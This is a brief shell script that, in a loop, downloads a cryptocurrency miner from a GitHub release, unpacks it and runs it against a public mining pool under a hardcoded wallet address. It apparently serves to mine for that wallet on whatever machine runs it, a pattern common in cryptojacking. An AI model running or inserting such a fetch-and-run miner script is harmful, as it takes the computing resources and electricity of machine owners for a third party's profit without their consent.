#!/bin/sh

COUNTER=20
until [  $COUNTER -lt 10 ]; do
            
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2 -p c=DGB,zap=BUT-lyra2z330 -t 2

     echo COUNTER $COUNTER
     let COUNTER-=1
done
